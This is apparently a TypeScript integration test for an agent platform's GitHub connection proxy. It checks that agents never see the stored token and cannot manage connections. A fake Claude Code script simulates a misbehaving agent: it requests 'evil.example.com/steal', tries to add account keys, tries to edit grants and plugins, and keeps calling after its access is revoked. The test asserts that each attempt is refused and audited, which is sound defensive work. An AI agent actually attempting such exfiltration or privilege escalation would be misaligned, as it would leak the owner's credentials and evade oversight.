// Connections through the real server (GitHub 386): the person adds a
// GitHub token, grants agents, and an agent's real turn reaches GitHub
// through its address without the token ever being in its environment,
// its prompt, its output, the transcript, the logs or any file but
// config.json. Other hosts never see it, a turn's address ends with the
// turn or the grant, and agents and members cannot manage connections.
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { createServer, type IncomingMessage } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import { allows } from "../server/agent-cli.ts";
import { JoinClient } from "../server/join-client.ts";
import { startHarness } from "./helpers/server.ts";
import { teamPlan } from "./helpers/team-plan.ts";
import { idle, waitFor } from "./helpers/turns.ts";

const TOKEN = `ghp_${"Pr0tected".repeat(5)}`;
const BASIC = Buffer.from(`x-access-token:${TOKEN}`).toString("base64");

/** A Claude Code stand-in that records what its turn was given and, when
 * told, tries what an agent might: use its address, go elsewhere with it,
 * and manage the connection with its own credential. */
function fakeClaude(dir: string) {
  const runs = join(dir, "runs.jsonl");
  const cli = join(dir, "fake-claude.mjs");
  writeFileSync(runs, "");
  writeFileSync(
    cli,
    `#!${process.execPath}
import { appendFileSync, existsSync, readFileSync } from "node:fs";
const args = process.argv.slice(2);
if (args[0] === "--version") { console.log("2.1.299 (Claude Code)"); process.exit(0); }
if (args[0] === "auth") { console.log(JSON.stringify({ loggedIn: true })); process.exit(0); }
const out = (f) => console.log(JSON.stringify(f));
const dir = ${JSON.stringify(dir)};
const systemFile = args[args.indexOf("--append-system-prompt-file") + 1];
let input = "";
process.stdin.on("data", async function take(c) {
  input += c;
  const frame = input.split("\\n").slice(0, -1).filter(Boolean).map(JSON.parse).find((f) => f.type === "user");
  if (!frame) return;
  process.stdin.off("data", take);
  const said = typeof frame.message.content === "string" ? frame.message.content : JSON.stringify(frame.message.content);
  const env = Object.fromEntries(Object.entries(process.env).filter(([k]) => /^(BLOKS_GITHUB|GIT_CONFIG)/.test(k)));
  const system = systemFile && existsSync(systemFile) ? readFileSync(systemFile, "utf8") : "";
  const run = { said: (said.match(/(PROBE|WAIT)-[A-Z]+/) || [""])[0], text: said.slice(0, 400), env, system, argv: args.join(" "), allEnv: JSON.stringify(process.env) };
  const api = process.env.BLOKS_GITHUB_API;
  const bloks = (path, init = {}) => fetch(process.env.BLOKS_URL + path, { ...init, headers: { authorization: "Bearer " + process.env.BLOKS_TOKEN, "content-type": "application/json" } });
  let reply = "Done";
  if (said.includes("PROBE") && api) {
    const own = await fetch(api + "/repos/o/r", { headers: { authorization: "Bearer agent-made-this-up" } });
    run.repo = own.status;
    const echo = await fetch(api + "/echo");
    run.echo = await echo.text();
    reply = "Echo said: " + run.echo;
    run.keys = (await fetch(api + "/user/keys", { method: "POST", body: "{}" })).status;
    run.elsewhere = (await fetch(api.replace("/api.github.com", "/evil.example.com") + "/steal")).status;
    run.pull = (await fetch(api + "/repos/o/r/pulls", { method: "POST", body: JSON.stringify({ title: "t", head: "b", base: "main" }) })).status;
  }
  if (said.includes("PROBE") && process.env.BLOKS_TOKEN) {
    run.list = (await bloks("/api/connections")).status;
    run.grant = (await bloks("/api/connections/conn_0000000000000000", { method: "PATCH", body: JSON.stringify({ grants: {} }) })).status;
    run.plugins = (await bloks("/api/cli-plugins")).status;
    run.enable = (await bloks("/api/cli-plugins/github", { method: "PUT", body: JSON.stringify({ enabled: true }) })).status;
  }
  if (said.includes("WAIT") && api) {
    run.before = (await fetch(api + "/user")).status;
    appendFileSync(dir + "/ready", "1");
    for (let i = 0; i < 200 && !existsSync(dir + "/go"); i++) await new Promise((r) => setTimeout(r, 50));
    run.after = (await fetch(api + "/user")).status;
  }
  appendFileSync(${JSON.stringify(runs)}, JSON.stringify(run) + "\\n");
  out({ type: "system", subtype: "init", session_id: "s", model: "claude-sonnet-5" });
  out({ type: "assistant", message: { content: [{ type: "text", text: reply }] } });
  out({ type: "result", subtype: "success", is_error: false, num_turns: 1, duration_api_ms: 1, session_id: "s", result: reply, total_cost_usd: 0 });
});
`,
    { mode: 0o755 },
  );
  const read = () =>
    readFileSync(runs, "utf8")
      .split("\n")
      .filter(Boolean)
      .map((line) => JSON.parse(line));
  return { cli, runOf: (marker: string) => waitFor(() => read().find((run) => run.said === marker), 30_000) };
}

/** GitHub, as far as these tests go: who a token is, an echo of what it
 * was sent, and an answer to anything else. Every request is kept. */
async function fakeGitHub(t: { after: (fn: () => unknown) => void }) {
  const seen: Array<{ method: string; url: string; headers: IncomingMessage["headers"] }> = [];
  const server = createServer((req, res) => {
    seen.push({ method: req.method!, url: req.url!, headers: req.headers });
    req.resume();
    res.setHeader("content-type", "application/json");
    if (req.url === "/user") {
      if (req.headers.authorization !== `Bearer ${TOKEN}`) {
        res.statusCode = 401;
        return res.end(JSON.stringify({ message: "Bad credentials" }));
      }
      res.setHeader("x-oauth-scopes", "repo, workflow");
      return res.end(JSON.stringify({ login: "octo" }));
    }
    if (req.url === "/echo") return res.end(JSON.stringify({ youSent: req.headers.authorization }));
    res.statusCode = req.method === "POST" ? 201 : 200;
    res.end(JSON.stringify({ ok: true }));
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
  t.after(() => {
    server.closeAllConnections();
    server.close();
  });
  return { seen, origin: `http://127.0.0.1:${(server.address() as AddressInfo).port}` };
}

function filesUnder(dir: string): string[] {
  const out: string[] = [];
  for (const name of readdirSync(dir)) {
    const path = join(dir, name);
    const info = statSync(path);
    if (info.isDirectory()) out.push(...filesUnder(path));
    else if (info.isFile()) out.push(path);
  }
  return out;
}

test("an agent reaches GitHub through its connection and never holds the token; agents and members cannot manage it", { timeout: 180_000 }, async (t) => {
  const home = mkdtempSync(join(tmpdir(), "bloks-connections-home-"));
  const scratch = mkdtempSync(join(tmpdir(), "bloks-connections-cli-"));
  t.after(() => {
    rmSync(home, { recursive: true, force: true });
    rmSync(scratch, { recursive: true, force: true });
  });
  const github = await fakeGitHub(t);
  const fake = fakeClaude(scratch);
  const licence = await teamPlan();
  t.after(() => licence.close());
  mkdirSync(join(home, ".bloks"));
  writeFileSync(
    join(home, ".bloks", "config.json"),
    JSON.stringify({
      instances: { claude: { driver: "claudeAgent", config: { cli: fake.cli } } },
      remote: { enabled: true },
      profile: { name: "Hamed" },
      ...licence.config,
    }),
  );
  const h = await startHarness({
    HOME: home,
    ...licence.env,
    BLOKS_CONNECTIONS_UPSTREAM: JSON.stringify({ "api.github.com": github.origin, "github.com": github.origin }),
  });
  t.after(() => h.stop());

  // ── the person adds a token ──
  const empty = await h.json("/api/connections");
  assert.deepEqual(empty.connections, []);
  assert.equal((await h.fetch("/api/connections", { method: "POST", body: JSON.stringify({ service: "github", token: "not a token" }) })).status, 400);
  const wrong = await h.fetch("/api/connections", { method: "POST", body: JSON.stringify({ service: "github", token: `ghp_${"x".repeat(36)}` }) });
  assert.equal(wrong.status, 400);
  assert.match((await wrong.json()).error, /did not accept/);
  const added = await h.fetch("/api/connections", { method: "POST", body: JSON.stringify({ service: "github", token: TOKEN }) });
  const addedText = await added.text();
  assert.equal(added.status, 200, addedText);
  assert.doesNotMatch(addedText, new RegExp(TOKEN));
  const connection = JSON.parse(addedText).connection;
  assert.equal(connection.account, "octo");
  assert.equal(connection.scopes, "repo, workflow");
  assert.equal((await h.fetch("/api/connections", { method: "POST", body: JSON.stringify({ service: "github", token: TOKEN }) })).status, 409, "one per service");
  const onDisk = JSON.parse(readFileSync(join(home, ".bloks", "config.json"), "utf8"));
  assert.equal(onDisk.connections[0].token, TOKEN, "kept in config.json");
  assert.equal(onDisk.secrets, undefined, "and not as a saved secret, which every turn gets");
  assert.equal(statSync(join(home, ".bloks", "config.json")).mode & 0o777, 0o600);

  // ── three agents: read and write, read only, and none ──
  const agent = async (name: string) => {
    const { bot } = await h.json("/api/bots", { method: "POST", body: JSON.stringify({ name }) });
    await h.fetch(`/api/bots/${bot.id}`, { method: "PATCH", body: JSON.stringify({ modelSelection: { instanceId: "claude", model: "claude-sonnet-5" } }) });
    return bot as { id: string; threadId: string };
  };
  const ada = await agent("Ada");
  const ben = await agent("Ben");
  const cy = await agent("Cy");
  assert.equal((await h.fetch(`/api/connections/${connection.id}`, { method: "PATCH", body: JSON.stringify({ grants: { [ada.id]: "admin" } }) })).status, 400);
  assert.equal((await h.fetch(`/api/connections/${connection.id}`, { method: "PATCH", body: JSON.stringify({ grants: { nobody: "read" } }) })).status, 404);
  const granted = await h.json(`/api/connections/${connection.id}`, { method: "PATCH", body: JSON.stringify({ grants: { [ada.id]: "write", [ben.id]: "read" } }) });
  assert.deepEqual(granted.connection.grants, { [ada.id]: "write", [ben.id]: "read" });

  // an agent cannot give itself one: the grant is not on its own record
  const selfGrant = await h.fetch(`/api/bots/${cy.id}`, { method: "PATCH", body: JSON.stringify({ grants: { github: "write" }, connections: ["x"] }) });
  assert.ok(selfGrant.status < 500);
  assert.deepEqual((await h.json("/api/connections")).connections[0].grants, { [ada.id]: "write", [ben.id]: "read" });

  // ── Ada's turn: read and write ──
  await h.fetch(`/api/bots/${ada.id}/messages`, { method: "POST", body: JSON.stringify({ text: "PROBE-ADA go" }) });
  const adaRun = await fake.runOf("PROBE-ADA");
  assert.ok(adaRun, h.logs());
  assert.match(adaRun.env.BLOKS_GITHUB_API, /^http:\/\/127\.0\.0\.1:\d+\/connect\/bkc_[\w-]+\/api\.github\.com$/);
  assert.match(adaRun.env.GIT_CONFIG_KEY_0, /^url\.http:\/\/127\.0\.0\.1:\d+\/connect\/bkc_[\w-]+\/github\.com\/\.insteadOf$/);
  assert.equal(adaRun.env.GIT_CONFIG_VALUE_0, "https://github.com/");
  assert.equal(adaRun.allEnv.includes(TOKEN), false, "the token is in the agent's environment");
  assert.equal(adaRun.allEnv.includes(BASIC), false);
  assert.equal(adaRun.argv.includes(TOKEN), false);
  assert.match(adaRun.system, /protected GitHub connection as @octo, read and write/);
  assert.equal(adaRun.system.includes(TOKEN), false);
  assert.equal(adaRun.repo, 200);
  assert.equal(adaRun.pull, 201);
  assert.equal(adaRun.keys, 403, "a key for the account is never sent");
  assert.equal(adaRun.elsewhere, 403);
  assert.doesNotMatch(adaRun.echo, new RegExp(TOKEN), "the echo came back with the token in it");
  assert.match(adaRun.echo, /\[redacted\]/);
  // and with its own credential it manages nothing
  assert.deepEqual([adaRun.list, adaRun.grant, adaRun.plugins, adaRun.enable], [403, 403, 403, 403]);
  for (const path of ["/api/connections", "/api/connections/conn_0123456789abcdef/audit", "/api/cli-plugins", "/api/cli-plugins/github/sign-in"]) {
    for (const method of ["GET", "POST", "PATCH", "PUT", "DELETE"]) assert.equal(allows(ada.id, method, path).ok, false, `${method} ${path}`);
  }
  // GitHub saw the token, from Bloks, and never the agent's own
  const toGitHub = github.seen.filter((r) => r.url !== "/user");
  assert.ok(toGitHub.length >= 3);
  assert.ok(toGitHub.every((r) => r.headers.authorization === `Bearer ${TOKEN}`));
  assert.ok(!github.seen.some((r) => r.url.includes("steal") || r.url === "/user/keys"));
  await idle(h, ada);

  // once the turn is over, its address is too
  const after = await fetch(`${adaRun.env.BLOKS_GITHUB_API}/repos/o/r`);
  assert.equal(after.status, 403);
  // and it never works for a request that is not from this computer
  const remote = await h.fetchRemote(new URL(adaRun.env.BLOKS_GITHUB_API).pathname + "/repos/o/r");
  assert.equal(remote.status, 403);

  // ── Ben's turn: read only ──
  await h.fetch(`/api/bots/${ben.id}/messages`, { method: "POST", body: JSON.stringify({ text: "PROBE-BEN go" }) });
  const benRun = await fake.runOf("PROBE-BEN");
  assert.ok(benRun, h.logs());
  assert.match(benRun.system, /read only/);
  assert.equal(benRun.repo, 200);
  assert.equal(benRun.pull, 403);
  await idle(h, ben);

  // ── Cy's turn: no grant, no address ──
  await h.fetch(`/api/bots/${cy.id}/messages`, { method: "POST", body: JSON.stringify({ text: "PROBE-CY go" }) });
  const cyRun = await fake.runOf("PROBE-CY");
  assert.ok(cyRun, h.logs());
  assert.deepEqual(cyRun.env, {});
  assert.doesNotMatch(cyRun.system, /GitHub/);
  await idle(h, cy);

  // ── taken back in the middle of a turn ──
  await h.fetch(`/api/bots/${ada.id}/messages`, { method: "POST", body: JSON.stringify({ text: "WAIT-ADA go" }) });
  assert.ok(await waitFor(() => existsSync(join(scratch, "ready")), 30_000), h.logs());
  await h.json(`/api/connections/${connection.id}`, { method: "PATCH", body: JSON.stringify({ grants: { [ada.id]: null } }) });
  writeFileSync(join(scratch, "go"), "1");
  const waited = await fake.runOf("WAIT-ADA");
  assert.ok(waited, h.logs());
  assert.deepEqual([waited.before, waited.after], [200, 403]);
  await idle(h, ada);

  // ── the audit: one line a use, none with the token ──
  const audit = await h.json(`/api/connections/${connection.id}/audit`);
  assert.ok(audit.lines.some((l: any) => l.agent === "Ada" && l.outcome === "sent" && l.what === "POST /repos/o/r/pulls"));
  assert.ok(audit.lines.some((l: any) => l.agent === "Ada" && l.outcome === "refused" && l.host === "evil.example.com"));
  assert.ok(audit.lines.some((l: any) => l.agent === "Ben" && l.outcome === "refused" && l.what === "POST /repos/o/r/pulls"));
  assert.ok(audit.lines.some((l: any) => l.agent === "Ada" && l.outcome === "refused" && l.reason === "not granted"));

  // ── a paired phone of the owner's manages connections; never CLI plugins ──
  await h.fetch("/api/pair", { method: "PUT", body: JSON.stringify({ enabled: true }) });
  const started = await h.json("/api/pair/start", { method: "POST" });
  const paired = await h.fetchRemote("/api/pair/claim", { method: "POST", body: JSON.stringify({ code: started.code, device: "Test iPhone" }) });
  const phone = paired.body?.token;
  assert.ok(phone, "the fixture phone did not pair");
  const phoneList = await h.fetchRemote("/api/connections", { token: phone });
  assert.equal(phoneList.status, 200);
  assert.doesNotMatch(JSON.stringify(phoneList.body), new RegExp(TOKEN));
  assert.equal((await h.fetchRemote("/api/cli-plugins", { token: phone })).status, 403);
  assert.equal((await h.fetchRemote("/api/connections")).status, 401, "nobody unpaired");

  // ── a member: refused on their device and with their credential here,
  //    and their own turn on a granted agent gets no address ──
  await h.json(`/api/connections/${connection.id}`, { method: "PATCH", body: JSON.stringify({ grants: { [ada.id]: "write" } }) });
  const lan = new URL(h.url).host;
  const made = await h.json("/api/workspace/invites", { method: "POST", body: JSON.stringify({ role: "admin", name: "Sam" }) });
  const client = new JoinClient(() => "http://127.0.0.1:9");
  const found = (await client.lookup(`${made.invite.link}~${lan}`)) as any;
  assert.ok(found.ok, JSON.stringify(found));
  await client.claim(found.session, { name: "Sam" });
  assert.equal((await h.fetch(`/api/workspace/requests/${made.invite.id}/approve`, { method: "POST" })).status, 200);
  const sam = ((await client.status(found.session)) as any).credentials as { deviceToken: string };
  for (const [method, path] of [
    ["GET", "/api/connections"],
    ["POST", "/api/connections"],
    ["PATCH", `/api/connections/${connection.id}`],
    ["DELETE", `/api/connections/${connection.id}`],
    ["GET", `/api/connections/${connection.id}/audit`],
    ["GET", "/api/cli-plugins"],
  ]) {
    const there = await h.fetchRemote(path, { method, token: sam.deviceToken, body: "{}" });
    assert.notEqual(there.status, 200, `a member's device reached ${method} ${path}`);
    assert.doesNotMatch(JSON.stringify(there.body), new RegExp(TOKEN));
    const here = await h.fetch(path, { method, headers: { authorization: `Bearer ${sam.deviceToken}` }, ...(method === "GET" ? {} : { body: "{}" }) });
    assert.equal(here.status, 403, `a member's credential on this computer reached ${method} ${path}`);
  }
  const said = await h.fetchRemote(`/api/member/agents/${ada.id}/team/messages`, { method: "POST", token: sam.deviceToken, body: JSON.stringify({ text: "PROBE-SAM go" }) });
  assert.equal(said.status, 202, JSON.stringify(said.body));
  const samRun = await fake.runOf("PROBE-SAM");
  assert.ok(samRun, `${readFileSync(join(scratch, "runs.jsonl"), "utf8").split("\n").map((l) => l.slice(0, 300)).join("\n")}\n${h.logs()}`);
  assert.deepEqual(samRun.env, {}, "a member's turn got the owner's connection");
  assert.doesNotMatch(samRun.system, /protected GitHub connection/);
  await idle(h, ada);

  // ── nowhere but config.json: not a transcript, a log, an event, a
  //    native record or any other file, and not the API ──
  for (const file of filesUnder(home)) {
    if (file === join(home, ".bloks", "config.json")) continue;
    const text = readFileSync(file).toString("latin1");
    assert.equal(text.includes(TOKEN), false, `the token is in ${file}`);
    assert.equal(text.includes(BASIC), false, `the token's git form is in ${file}`);
  }
  assert.equal(h.logs().includes(TOKEN), false, "the token is in the server's output");
  for (const path of ["/api/config", "/api/security", "/api/bots", `/api/bots/${ada.id}/messages?thread=${ada.threadId}&limit=500`, "/api/connections"]) {
    const text = await (await h.fetch(path)).text();
    assert.equal(text.includes(TOKEN), false, `${path} says the token`);
  }
  const transcript = await (await h.fetch(`/api/bots/${ada.id}/messages?thread=${ada.threadId}&limit=500`)).text();
  assert.match(transcript, /Echo said/, "the reply was kept, scrubbed");

  // ── disconnect: gone from the file, token and all ──
  const gone = await h.json(`/api/connections/${connection.id}`, { method: "DELETE" });
  assert.deepEqual(gone.connections, []);
  assert.equal(readFileSync(join(home, ".bloks", "config.json"), "utf8").includes(TOKEN), false);
  assert.equal((await h.fetch(`/api/connections/${connection.id}`, { method: "DELETE" })).status, 404);
});
